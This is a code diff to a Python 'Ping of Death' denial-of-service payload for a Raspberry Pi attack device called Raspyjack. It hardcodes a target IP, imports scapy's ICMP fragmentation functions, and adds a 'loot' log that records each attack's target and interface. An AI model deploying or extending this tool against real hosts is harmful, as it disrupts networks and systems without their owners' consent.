@@ -30,7 +30,13 @@ import os
 import time
 import signal
 import subprocess
-sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
+
+RASPYJACK_ROOT = '/root/Raspyjack' if os.path.isdir('/root/Raspyjack') else os.path.abspath(os.path.join(__file__, '..', '..'))
+if RASPYJACK_ROOT not in sys.path:
+    sys.path.insert(0, RASPYJACK_ROOT)
+wifi_subdir = os.path.join(RASPYJACK_ROOT, 'wifi')
+if os.path.isdir(wifi_subdir) and wifi_subdir not in sys.path:
+    sys.path.insert(0, wifi_subdir)
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
@@ -39,6 +45,9 @@ from scapy.all import IP, ICMP, fragment, send, conf
 conf.verb = 0
 
 TARGET_IP = "192.168.1.51"
+
+LOOT_DIR = os.path.join(RASPYJACK_ROOT, 'loot', 'dos_ping_of_death')
+os.makedirs(LOOT_DIR, exist_ok=True)
 
 PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
 GPIO.setmode(GPIO.BCM)
@@ -56,11 +65,27 @@ ATTACK_INTERFACE = None
 
 def cleanup(*_):
     global running
-    running = False
-    print("Ping of Death cleanup complete.", file=sys.stderr)
+    if running:
+        running = False
+        save_loot_snapshot()
+        print("Ping of Death cleanup complete.", file=sys.stderr)
 
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
+
+def save_loot_snapshot():
+    """Save a loot snapshot with attack stats."""
+    try:
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        loot_file = os.path.join(LOOT_DIR, f"ping_of_death_{timestamp}.txt")
+        with open(loot_file, 'w') as f:
+            f.write(f"Ping of Death Attack\n")
+            f.write(f"Target IP: {TARGET_IP}\n")
+            f.write(f"Interface: {ATTACK_INTERFACE}\n")
+            f.write(f"Timestamp: {timestamp}\n")
+        print(f"Loot saved to {loot_file}")
+    except Exception as e:
+        print(f"Error saving loot: {e}", file=sys.stderr)
 
 def draw_ui(screen_state="main", message_lines=None):
     img = Image.new("RGB", (WIDTH, HEIGHT), "black")
